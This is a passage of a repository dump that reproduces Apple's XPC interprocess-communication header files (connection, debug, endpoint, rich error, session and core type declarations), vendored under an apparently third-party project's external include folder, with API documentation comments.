 * event handler to be scheduled with the XPC_ERROR_CONNECTION_INVALID error.
 * After that invocation, there will be no further invocations of the event
 * handler.
 *
 * The XPC runtime guarantees this non-preemptiveness even for concurrent target
 * queues.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
void
xpc_connection_cancel(xpc_connection_t connection);

/*!
 * @function xpc_connection_get_name
 * Returns the name of the service with which the connections was created.
 *
 * @param connection
 * The connection object which is to be examined.
 *
 * @result
 * The name of the remote service. If you obtained the connection through an
 * invocation of another connection's event handler, NULL is returned.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
const char * _Nullable
xpc_connection_get_name(xpc_connection_t connection);

/*!
 * @function xpc_connection_get_euid
 * Returns the EUID of the remote peer.
 *
 * @param connection
 * The connection object which is to be examined.
 *
 * @result
 * The EUID of the remote peer at the time the connection was made.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
uid_t
xpc_connection_get_euid(xpc_connection_t connection);

/*!
 * @function xpc_connection_get_egid
 * Returns the EGID of the remote peer.
 *
 * @param connection
 * The connection object which is to be examined.
 *
 * @result
 * The EGID of the remote peer at the time the connection was made.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
gid_t
xpc_connection_get_egid(xpc_connection_t connection);

/*!
 * @function xpc_connection_get_pid
 * Returns the PID of the remote peer.
 *
 * @param connection
 * The connection object which is to be examined.
 *
 * @result
 * The PID of the remote peer.
 *
 * @discussion
 * A given PID is not guaranteed to be unique across an entire boot cycle.
 * Great care should be taken when dealing with this information, as it can go
 * stale after the connection is established. OS X recycles PIDs, and therefore
 * another process could spawn and claim the PID before a message is actually
 * received from the connection.
 *
 * XPC will deliver an error to your event handler if the remote process goes
 * away, but there are no guarantees as to the timing of this notification's
 * delivery either at the kernel layer or at the XPC layer.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
pid_t
xpc_connection_get_pid(xpc_connection_t connection);

/*!
 * @function xpc_connection_get_asid
 * Returns the audit session identifier of the remote peer.
 *
 * @param connection
 * The connection object which is to be examined.
 *
 * @result
 * The audit session ID of the remote peer at the time the connection was made.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
au_asid_t
xpc_connection_get_asid(xpc_connection_t connection);

/*!
 * @function xpc_connection_set_context
 * Sets context on an connection.
 *
 * @param connection
 * The connection which is to be manipulated.
 *
 * @param context
 * The context to associate with the connection.
 *
 * @discussion
 * If you must manage the memory of the context object, you must set a finalizer
 * to dispose of it. If this method is called on a connection which already has
 * context associated with it, the finalizer will NOT be invoked. The finalizer
 * is only invoked when the connection is being deallocated.
 *
 * It is recommended that, instead of changing the actual context pointer
 * associated with the object, you instead change the state of the context
 * object itself.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_connection_set_context(xpc_connection_t connection,
	void * _Nullable context);

/*!
 * @function xpc_connection_get_context
 * Returns the context associated with the connection.
 *
 * @param connection
 * The connection which is to be examined.
 *
 * @result
 * The context associated with the connection. NULL if there has been no context
 * associated with the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
void * _Nullable
xpc_connection_get_context(xpc_connection_t connection);

/*!
 * @function xpc_connection_set_finalizer_f
 * Sets the finalizer for the given connection.
 *
 * @param connection
 * The connection on which to set the finalizer.
 *
 * @param finalizer
 * The function that will be invoked when the connection's retain count has
 * dropped to zero and is being torn down.
 *
 * @discussion
 * This method disposes of the context value associated with a connection, as
 * set by {@link xpc_connection_set_context}.
 *
 * For many uses of context objects, this API allows for a convenient shorthand
 * for freeing them. For example, for a context object allocated with malloc(3):
 *
 * xpc_connection_set_finalizer_f(object, free);
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_connection_set_finalizer_f(xpc_connection_t connection,
	xpc_finalizer_t _Nullable finalizer);

/*!
 * @function xpc_connection_set_peer_code_signing_requirement
 * Requires that the connection peer satisfies a code signing requirement.
 *
 * @param connection
 * The connection object which is to be modified.
 *
 * @param requirement
 * The code signing requirement to be satisfied by the peer
 * It is safe to deallocate the requirement string after calling `xpc_connection_set_peer_code_signing_requirement`
 *
 * @result
 * 0 on success, non-zero on error
 *
 * @discussion
 * This function will return an error promptly if the code signing requirement string is invalid.
 *
 * It is a programming error to call `xpc_connection_set_peer_code_signing_requirement` more than once per connection.
 *
 * All messages received on this connection will be checked to ensure they come from a peer who satisfies
 * the code signing requirement. For a listener connection, requests that do not satisfy the requirement
 * are dropped. When a reply is expected on the connection and the peer does not satisfy the requirement
 * XPC_ERROR_PEER_CODE_SIGNING_REQUIREMENT will be delivered instead of the reply.
 *
 * This API is not supported on embedded platforms and will return ENOTSUP. 
 *
 * @see https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/RequirementLang/RequirementLang.html
 */
__API_AVAILABLE(macos(12.0))
XPC_EXPORT XPC_NONNULL_ALL XPC_WARN_RESULT
int
xpc_connection_set_peer_code_signing_requirement(xpc_connection_t connection, const char *requirement);


__END_DECLS
XPC_ASSUME_NONNULL_END

#endif // __XPC_CONNECTION_H__

```

`BaseBin/_external/include/xpc/debug.h`:

```h
#ifndef __XPC_DEBUG_H__
#define __XPC_DEBUG_H__

/*!
 * @function xpc_debugger_api_misuse_info
 * Returns a pointer to a string describing the reason XPC aborted the calling
 * process. On OS X, this will be the same string present in the "Application
 * Specific Information" section of the crash report.
 * 
 * @result
 * A pointer to the human-readable string describing the reason the caller was
 * aborted. If XPC was not responsible for the program's termination, NULL will
 * be returned.
 *
 * @discussion
 * This function is only callable from within a debugger. It is not meant to be
 * called by the program directly.
 */
XPC_DEBUGGER_EXCL
const char *
xpc_debugger_api_misuse_info(void);

#endif // __XPC_DEBUG_H__ 

```

`BaseBin/_external/include/xpc/endpoint.h`:

```h
#ifndef __XPC_ENDPOINT_H__
#define __XPC_ENDPOINT_H__

/*!
 * @function xpc_endpoint_create
 * Creates a new endpoint from a connection that is suitable for embedding into
 * messages.
 * 
 * @param connection
 * Only connections obtained through calls to xpc_connection_create*() may be
 * given to this API. Passing any other type of connection is not supported and
 * will result in undefined behavior.
 *
 * @result
 * A new endpoint object. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_endpoint_t _Nonnull
xpc_endpoint_create(xpc_connection_t _Nonnull connection);

#endif // __XPC_ENDPOINT_H__ 

```

`BaseBin/_external/include/xpc/module.modulemap`:

```modulemap
module XPC [system] [extern_c] {
	header "xpc.h"
	header "availability.h"
	header "base.h"
	header "activity.h"
	header "connection.h"
	header "debug.h"
	header "endpoint.h"
	export *
}

```

`BaseBin/_external/include/xpc/rich_error.h`:

```h
#ifndef __XPC_RICH_ERROR_H__
#define __XPC_RICH_ERROR_H__

#ifndef __XPC_INDIRECT__
#error "Please #include <xpc/xpc.h> instead of this file directly."
// For HeaderDoc.
#include <xpc/base.h>
#endif // __XPC_INDIRECT__

#ifndef __BLOCKS__
#error "XPC Rich Errors require Blocks support."
#endif // __BLOCKS__

XPC_ASSUME_NONNULL_BEGIN
__BEGIN_DECLS

#pragma mark Properties
/*!
 * @function xpc_rich_error_copy_description
 * Copy the string description of an error.
 *
 * @param error
 * The error to be examined.
 *
 * @result
 * The underlying C string for the provided error. This string should be
 * disposed of with free(3) when done.
 * 
 * This will return NULL if a string description could not be generated.
 */
XPC_EXPORT XPC_WARN_RESULT
char * _Nullable
xpc_rich_error_copy_description(xpc_rich_error_t error);

/*!
 * @function xpc_rich_error_can_retry
 * Whether the operation the error originated from can be retried.
 *
 * @param error
 * The error to be inspected.
 *
 * @result
 * Whether the operation the error originated from can be retried.
 */
XPC_EXPORT XPC_WARN_RESULT
bool
xpc_rich_error_can_retry(xpc_rich_error_t error);

__END_DECLS
XPC_ASSUME_NONNULL_END

#endif // __XPC_RICH_ERROR_H__

```

`BaseBin/_external/include/xpc/session.h`:

```h
#ifndef __XPC_SESSION_H__
#define __XPC_SESSION_H__

#ifndef __XPC_INDIRECT__
#error "Please #include <xpc/xpc.h> instead of this file directly."
// For HeaderDoc.
#include <xpc/base.h>
#endif // __XPC_INDIRECT__

#ifndef __BLOCKS__
#error "XPC Session require Blocks support."
#endif // __BLOCKS__

XPC_ASSUME_NONNULL_BEGIN
__BEGIN_DECLS

#pragma mark Constants
/*!
 * @typedef xpc_session_create_flags_t
 * Constants representing different options available when creating an XPC
 * Session.
 *
 * @const XPC_SESSION_CREATE_INACTIVE
 * Indicates that the session should not be activated during its creation. The
 * returned session must be manually activated using
 * {@link xpc_session_activate} before it can be used.
 *
 * @const XPC_SESSION_CREATE_MACH_PRIVILEGED
 * Passed to {@link xpc_session_create_mach_service} to indicate that the job
 * advertising the service name in its launchd.plist(5) should be in the
 * privileged Mach bootstrap. This is typically accomplished by placing your
 * launchd.plist(5) in /Library/LaunchDaemons.
 */
XPC_FLAGS_ENUM(xpc_session_create_flags, uint64_t,
	XPC_SESSION_CREATE_NONE XPC_SWIFT_NAME("none") = 0,
	XPC_SESSION_CREATE_INACTIVE XPC_SWIFT_NAME("inactive") = (1 << 0),
	XPC_SESSION_CREATE_MACH_PRIVILEGED XPC_SWIFT_NAME("privileged") = (1 << 1)
);

#pragma mark Handlers
typedef void (^xpc_session_cancel_handler_t)(xpc_rich_error_t error);
typedef void (^xpc_session_incoming_message_handler_t)(xpc_object_t message);
typedef void (^xpc_session_reply_handler_t)(xpc_object_t _Nullable reply,
		xpc_rich_error_t _Nullable error);

#pragma mark Helpers
/*!
 * @function xpc_session_copy_description
 * Copy the string description of the session.
 *
 * @param session
 * The session to be examined.
 *
 * @result
 * The underlying C string description for the provided session. This string
 * should be disposed of with free(3) when done. This will return NULL if a
 * string description could not be generated.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT XPC_WARN_RESULT
char * _Nullable
xpc_session_copy_description(xpc_session_t session);

#pragma mark Client Session Creation
/*!
 * @function xpc_session_create_xpc_service
 * Creates a new session object representing a connection to the named service.
 *
 * @param name
 * The name of the service to create a session with.
 *
 * @param target_queue
 * The GCD queue onto which session events will be submitted. This may be a
 * concurrent queue. This parameter may be NULL, in which case the target queue
 * will be libdispatch's default target queue, defined as
 * DISPATCH_TARGET_QUEUE_DEFAULT.
 *
 * @param flags
 * Additional attributes which which to create the session.
 *
 * @param error_out
 * An out-parameter that, if set and in the event of an error, will point to an
 * {@link xpc_rich_error_t} describing the details of any errors that occurred.
 *
 * @result
 * On success this returns a new session object. The returned session is
 * activated by default and can be used to send messages. The caller is
 * responsible for disposing of the returned object with {@link xpc_release}
 * when it is no longer needed. On failure this will return NULL and if set,
 * error_out will be set to an error describing the failure.
 *
 * @discussion
 * This will fail if the specified XPC service is either not found or is
 * unavailable.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_session_t _Nullable
xpc_session_create_xpc_service(const char *name,
		dispatch_queue_t _Nullable target_queue,
		xpc_session_create_flags_t flags,
		xpc_rich_error_t _Nullable * _Nullable error_out);

/*!
 * @function xpc_session_create_mach_service
 * Creates a session with the service defined by the provided Mach service name.
 *
 * @param mach_service
 * The Mach service to create a session with. The service name must exist in the
 * Mach bootstrap that is accessible to the process and be advertised in a
 * launchd.plist.
 *
 * @param target_queue
 * The GCD queue onto which session events will be submitted. This may be a
 * concurrent queue. This parameter may be NULL, in which case the target queue
 * will be libdispatch's default target queue, defined as
 * DISPATCH_TARGET_QUEUE_DEFAULT.
 *
 * @param flags
 * Additional attributes which which to create the session.
 *
 * @param error_out
 * An out-parameter that, if set and in the event of an error, will point to an
 * {@link xpc_rich_error_t} describing the details of any errors that occurred.
 *
 * @param cancel_handler
 * The cancel handler block that will be executed when this session is canceled.
 *
 * @result
 * On success this returns a new session object. The returned session is
 * activated by default and can be used to send messages. The caller is
 * responsible for disposing of the returned object with {@link xpc_release}
 * when it is no longer needed. On failure this will return NULL and if set,
 * error_out will be set to an error describing the failure.
 *
 * @discussion
 * This will fail if the specified Mach service is either not found in the
 * bootstrap or is otherwise unavailable.
 *
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_session_t _Nullable
xpc_session_create_mach_service(const char *mach_service,
		dispatch_queue_t _Nullable target_queue,
		xpc_session_create_flags_t flags,
		xpc_rich_error_t _Nullable * _Nullable error_out);

#pragma mark Session Configuration
/*!
 * @function xpc_session_set_incoming_message_handler
 * Set an incoming message handler for a session.
 *
 * @param session
 * The session to set the handler for.
 *
 * @param handler
 * The handler block to be called when a message originated by the peer is
 * received through the provided session.
 *
 * @discussion
 * This can only be called on an inactive session. Calling this on a session
 * with an existing event handler will replace it.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT
void
xpc_session_set_incoming_message_handler(xpc_session_t session,
		xpc_session_incoming_message_handler_t handler);

/*!
 * @function xpc_session_set_cancel_handler
 * Set the cancel handler for a session.
 *
 * @param session
 * The session to set the cancel handler for.
 *
 * @param cancel_handler
 * The cancel handler block that will be executed when this session is canceled.
 *
 * @discussion
 * This can only be called on an inactive session. Calling this on a session
 * with an existing cancel handler will replace the existing cancel handler with
 * the one provided.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT
void
xpc_session_set_cancel_handler(xpc_session_t session,
		xpc_session_cancel_handler_t cancel_handler);

#pragma mark Lifecycle
/*!
 * @function xpc_session_activate
 * Activates a session.
 *
 * @param session
 * The session object to activate.
 *
 * @param error_out
 * An out-parameter that, if set and in the event of an error, will point to an
 * {@link xpc_rich_error_t} describing the details of any errors that occurred.
 *
 * @result
 * Returns whether session activation succeeded.
 *
 * @discussion
 * xpc_session_activate must not be called on a session that has been already
 * activated. Releasing the last reference on an inactive session that was
 * created with an xpc_session_create*() is undefined.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT
bool
xpc_session_activate(xpc_session_t session,
		xpc_rich_error_t _Nullable * _Nullable error_out);

/*!
 * @function xpc_session_cancel
 * Cancels the session. After this call, any messages that have not yet been
 * sent will be discarded, and the connection will be unwound. If there are
 * messages that are awaiting replies, they will have their reply handlers
 * invoked with an appropriate {@link xpc_rich_error_t}.
 *
 * @param session
 * The session object to cancel.
 *
 * @discussion
 * Session must have been activated to be canceled. Cancellation is asynchronous
 * and non-preemptive.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT
void
xpc_session_cancel(xpc_session_t session);

#pragma mark Message Send
/*!
 * @function xpc_session_send_message
 * Sends a message over the session to the destination service.
 *
 * @param session
 * The session to send the message over.
 *
 * @param message
 * The message to send. This must be a dictionary object.
 *
 * @result
 * In the event of an error this will return an {@link xpc_rich_error_t}
 * detailing the reasons for the failure. On success this return value will be
 * NULL.
 *
 * @discussion
 * Messages are delivered in FIFO order. This API is safe to call from multiple
 * GCD queues. There is no indication that a message was delivered successfully.
 * This is because even once the message has been successfully enqueued on the
 * remote end, there are no guarantees about when the runtime will dequeue the
 * message and invoke the other session's event handler block.
 *
 * If this is invoked on an inactive session, one created using the
 * XPC_SESSION_CREATE_INACTIVE flag and hasn't yet been activated, the process
 * will crash.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_rich_error_t _Nullable
xpc_session_send_message(xpc_session_t session, xpc_object_t message);

/*!
 * @function xpc_session_send_message_with_reply_sync
 * Sends a message over the session to the destination service and blocks the
 * caller until a reply is received.
 *
 * @param session
 * The session over which the message will be sent.
 *
 * @param message
 * The message to send. This must be a dictionary object.
 *
 * @param error_out
 * If this parameter is provided, in the event of a failure it will point to an
 * {@link xpc_rich_error_t} describing the details of the error.
 *
 * @result
 * On success, this will return the reply message as an {@link xpc_object_t}.
 * Otherwise NULL is returned.
 *
 * @discussion
 * This API supports priority inversion avoidance and should be used instead of
 * combining xpc_session_send_message_with_reply_async with a semaphore.
 *
 * If this is invoked on an inactive session, for example one created using the
 * XPC_SESSION_CREATE_INACTIVE flag that hasn't yet been activated, the process
 * will crash.
 * 
 * Invoking this API while the target queue is blocked would lead to deadlocks
 * in certain scenarios. For that reason, invoking it from the target queue
 * results in a crash.
 *
 * Be judicious about your use of this API. It can block indefinitely, so if you
 * are using it to implement an API that can be called from the main queue, you
 * may wish to consider allowing the API to take a queue and callback block so
 * that results may be delivered asynchronously if possible.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t _Nullable
xpc_session_send_message_with_reply_sync(xpc_session_t session,
		xpc_object_t message, xpc_rich_error_t _Nullable * _Nullable error_out);

/*!
 * @function xpc_session_send_message_with_reply_async
 * Sends a message over the session to the destination service and executes the
 * provided callback when a reply is received.
 *
 * @param session
 * The session over which the message will be sent.
 *
 * @param message
 * The message to send. This must be a dictionary object.
 *
 * @param reply_handler
 * The handler block to invoke when a reply to the message is received from the
 * session. If the session is torn down before the reply was received, for
 * example if the remote service exits prematurely, this handler will be
 * executed and passed an appropriate {@link xpc_rich_error_t} object describing
 * the failure.
 *
 * @discussion
 * If this is invoked on an inactive session, for example one created using the
 * XPC_SESSION_CREATE_INACTIVE flag that hasn't yet been activated, the process
 * will crash.
 *
 * If this is invoked on a cancelled session, this will generate a simulated
 * crash.
 */
API_AVAILABLE(macos(13.0), ios(16.0), tvos(16.0), watchos(9.0))
XPC_EXPORT
void
xpc_session_send_message_with_reply_async(xpc_session_t session,
		xpc_object_t message, xpc_session_reply_handler_t reply_handler);

__END_DECLS
XPC_ASSUME_NONNULL_END

#endif // __XPC_SESSION_H__

```

`BaseBin/_external/include/xpc/xpc.h`:

```h
// Copyright (c) 2009-2020 Apple Inc. All rights reserved. 

#ifndef __XPC_H__
#define __XPC_H__

#include <os/object.h>
#include <dispatch/dispatch.h>

#include <sys/mman.h>
#include <uuid/uuid.h>
#include <bsm/audit.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#ifndef __XPC_INDIRECT__
#define __XPC_INDIRECT__
#endif // __XPC_INDIRECT__

#include <xpc/base.h>

#if __has_include(<xpc/xpc_transaction_deprecate.h>)
#include <xpc/xpc_transaction_deprecate.h>
#else // __has_include(<xpc/transaction_deprecate.h>)
#define XPC_TRANSACTION_DEPRECATED
#endif // __has_include(<xpc/transaction_deprecate.h>)

XPC_ASSUME_NONNULL_BEGIN
__BEGIN_DECLS

#ifndef __OSX_AVAILABLE_STARTING
#define __OSX_AVAILABLE_STARTING(x, y)
#endif // __OSX_AVAILABLE_STARTING

#define XPC_API_VERSION 20200610

/*!
 * @typedef xpc_type_t
 * A type that describes XPC object types.
 */
typedef const struct _xpc_type_s * xpc_type_t;
#ifndef XPC_TYPE
#define XPC_TYPE(type) const struct _xpc_type_s type
#endif // XPC_TYPE

/*!
 * @typedef xpc_object_t
 * A type that can describe all XPC objects. Dictionaries, arrays, strings, etc.
 * are all described by this type.
 *
 * XPC objects are created with a retain count of 1, and therefore it is the
 * caller's responsibility to call xpc_release() on them when they are no longer
 * needed.
 */

#if OS_OBJECT_USE_OBJC
/* By default, XPC objects are declared as Objective-C types when building with
 * an Objective-C compiler. This allows them to participate in ARC, in RR
 * management by the Blocks runtime and in leaks checking by the static
 * analyzer, and enables them to be added to Cocoa collections.
 *
 * See <os/object.h> for details.
 */
OS_OBJECT_DECL(xpc_object);
#ifndef XPC_DECL
#define XPC_DECL(name) typedef xpc_object_t name##_t
#endif // XPC_DECL

#define XPC_GLOBAL_OBJECT(object) ((OS_OBJECT_BRIDGE xpc_object_t)&(object))
#define XPC_RETURNS_RETAINED OS_OBJECT_RETURNS_RETAINED
XPC_INLINE XPC_NONNULL_ALL
void
_xpc_object_validate(xpc_object_t object) {
	(void)*(unsigned long volatile *)(OS_OBJECT_BRIDGE void *)object;
}
#else // OS_OBJECT_USE_OBJC
typedef void * xpc_object_t;
#define XPC_DECL(name) typedef struct _##name##_s * name##_t
#define XPC_GLOBAL_OBJECT(object) (&(object))
#define XPC_RETURNS_RETAINED
#endif // OS_OBJECT_USE_OBJC 

/*!
 * @typedef xpc_handler_t
 * The type of block that is accepted by the XPC connection APIs.
 *
 * @param object
 * An XPC object that is to be handled. If there was an error, this object will
 * be equal to one of the well-known XPC_ERROR_* dictionaries and can be
 * compared with the equality operator.
 *
 * @discussion
 * You are not responsible for releasing the event object.
 */
#if __BLOCKS__
typedef void (^xpc_handler_t)(xpc_object_t object);
#endif // __BLOCKS__ 

/*!
 * @define XPC_TYPE_CONNECTION
 * A type representing a connection to a named service. This connection is
 * bidirectional and can be used to both send and receive messages. A
 * connection carries the credentials of the remote service provider.
 */
#define XPC_TYPE_CONNECTION (&_xpc_type_connection)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_connection);
XPC_DECL(xpc_connection);

/*!
 * @typedef xpc_connection_handler_t
 * The type of the function that will be invoked for a bundled XPC service when
 * there is a new connection on the service.
 *
 * @param connection
 * A new connection that is equivalent to one received by a listener connection.
 * See the documentation for {@link xpc_connection_set_event_handler} for the
 * semantics associated with the received connection.
 */
typedef void (*xpc_connection_handler_t)(xpc_connection_t connection);

/*!
 * @define XPC_TYPE_ENDPOINT
 * A type representing a connection in serialized form. Unlike a connection, an
 * endpoint is an inert object that does not have any runtime activity
 * associated with it. Thus, it is safe to pass an endpoint in a message. Upon
 * receiving an endpoint, the recipient can use
 * xpc_connection_create_from_endpoint() to create as many distinct connections
 * as desired. 
 */
#define XPC_TYPE_ENDPOINT (&_xpc_type_endpoint)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_endpoint);
XPC_DECL(xpc_endpoint);

/*!
 * @define XPC_TYPE_NULL
 * A type representing a null object. This type is useful for disambiguating
 * an unset key in a dictionary and one which has been reserved but set empty.
 * Also, this type is a way to represent a "null" value in dictionaries, which
 * do not accept NULL.
 */
#define XPC_TYPE_NULL (&_xpc_type_null)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_null);

/*!
 * @define XPC_TYPE_BOOL
 * A type representing a Boolean value.
 */
#define XPC_TYPE_BOOL (&_xpc_type_bool)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_bool);

/*!
 * @define XPC_BOOL_TRUE
 * A constant representing a Boolean value of true. You may compare a Boolean
 * object against this constant to determine its value.
 */
#define XPC_BOOL_TRUE XPC_GLOBAL_OBJECT(_xpc_bool_true)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const struct _xpc_bool_s _xpc_bool_true;

/*!
 * @define XPC_BOOL_FALSE
 * A constant representing a Boolean value of false. You may compare a Boolean
 * object against this constant to determine its value.
 */
#define XPC_BOOL_FALSE XPC_GLOBAL_OBJECT(_xpc_bool_false)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const struct _xpc_bool_s _xpc_bool_false;

/*!
 * @define XPC_TYPE_INT64
 * A type representing a signed, 64-bit integer value.
 */
#define XPC_TYPE_INT64 (&_xpc_type_int64)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_int64);

/*!
 * @define XPC_TYPE_UINT64
 * A type representing an unsigned, 64-bit integer value.
 */
#define XPC_TYPE_UINT64 (&_xpc_type_uint64)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_uint64);

/*!
 * @define XPC_TYPE_DOUBLE
 * A type representing an IEEE-compliant, double-precision floating point value.
 */
#define XPC_TYPE_DOUBLE (&_xpc_type_double)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_double);

/*!
 * @define XPC_TYPE_DATE
 * A type representing a date interval. The interval is with respect to the
 * Unix epoch. XPC dates are in Unix time and are thus unaware of local time
 * or leap seconds.
 */
#define XPC_TYPE_DATE (&_xpc_type_date)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_date);

/*!
 * @define XPC_TYPE_DATA
 * A type representing a an arbitrary buffer of bytes.
 */
#define XPC_TYPE_DATA (&_xpc_type_data)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_data);

/*!
 * @define XPC_TYPE_STRING
 * A type representing a NUL-terminated C-string.
 */
#define XPC_TYPE_STRING (&_xpc_type_string)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_string);

/*!
 * @define XPC_TYPE_UUID
 * A type representing a Universally Unique Identifier as defined by uuid(3). 
 */
#define XPC_TYPE_UUID (&_xpc_type_uuid)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_uuid);

/*!
 * @define XPC_TYPE_FD
 * A type representing a POSIX file descriptor.
 */
#define XPC_TYPE_FD (&_xpc_type_fd)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_fd);

/*!
 * @define XPC_TYPE_SHMEM
 * A type representing a region of shared memory.
 */
#define XPC_TYPE_SHMEM (&_xpc_type_shmem)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_shmem);

/*!
 * @define XPC_TYPE_ARRAY
 * A type representing an array of XPC objects. This array must be contiguous,
 * i.e. it cannot contain NULL values. If you wish to indicate that a slot
 * is empty, you can insert a null object. The array will grow as needed to
 * accommodate more objects.
 */
#define XPC_TYPE_ARRAY (&_xpc_type_array)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_array);

/*!
 * @define XPC_TYPE_DICTIONARY
 * A type representing a dictionary of XPC objects, keyed off of C-strings.
 * You may insert NULL values into this collection. The dictionary will grow
 * as needed to accommodate more key/value pairs.
 */
#define XPC_TYPE_DICTIONARY (&_xpc_type_dictionary)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_dictionary);

/*!
 * @define XPC_TYPE_ERROR
 * A type representing an error object. Errors in XPC are dictionaries, but
 * xpc_get_type() will return this type when given an error object. You
 * cannot create an error object directly; XPC will only give them to handlers.
 * These error objects have pointer values that are constant across the lifetime
 * of your process and can be safely compared.
 *
 * These constants are enumerated in the header for the connection object. Error
 * dictionaries may reserve keys so that they can be queried to obtain more
 * detailed information about the error. Currently, the only reserved key is
 * XPC_ERROR_KEY_DESCRIPTION.
 */
#define XPC_TYPE_ERROR (&_xpc_type_error)
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
XPC_TYPE(_xpc_type_error);

/*!
 * @define XPC_ERROR_KEY_DESCRIPTION
 * In an error dictionary, querying for this key will return a string object
 * that describes the error in a human-readable way.
 */
#define XPC_ERROR_KEY_DESCRIPTION _xpc_error_key_description
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const char * const _xpc_error_key_description;

/*!
 * @define XPC_EVENT_KEY_NAME
 * In an event dictionary, this querying for this key will return a string
 * object that describes the event.
 */
#define XPC_EVENT_KEY_NAME _xpc_event_key_name
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT
const char * const _xpc_event_key_name;

/*!
 * @define XPC_TYPE_SESSION
 *
 * @discussion
 * Sessions represent a stateful connection between a client and a service. When either end of the connection
 * disconnects, the entire session will be invalidated. In this case the system will make no attempt to
 * reestablish the connection or relaunch the service.
 *
 * Clients can initiate a session with a service that accepts xpc_connection_t connections but session
 * semantics will be maintained.
 *
 */
#define XPC_TYPE_SESSION (&_xpc_type_session)
XPC_EXPORT
XPC_TYPE(_xpc_type_session);
XPC_DECL(xpc_session);

/*!
 * @define XPC_TYPE_RICH_ERROR
 *
 * @discussion
 * Rich errors provide a simple dynamic error type that can indicate whether an
 * error is retry-able or not.
 */
